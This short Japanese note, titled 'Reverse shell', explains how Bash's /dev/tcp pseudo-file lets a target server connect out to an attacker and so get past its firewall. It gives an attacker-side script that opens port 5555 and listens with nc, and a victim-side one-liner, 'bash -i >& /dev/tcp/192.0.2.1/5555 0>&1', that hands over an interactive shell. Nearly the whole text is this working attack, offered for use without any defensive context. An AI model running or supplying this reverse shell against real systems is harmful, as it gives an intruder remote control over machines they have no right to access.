# リバースシェル

## 概要

Bashのtcpソケット機能(仮想ファイル)を使用することで、サーバ側のfirewallに影響されずに、サーバ側から攻撃側にアクセスすることで操作を乗っ取れる

## 操作する側(192.0.2.1)

```bash
#!/bin/bash

firewall-cmd --add-port=5555/tcp
nc -lp 5555
```

## 操作される側

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.0.2.1/5555 0>&1
```
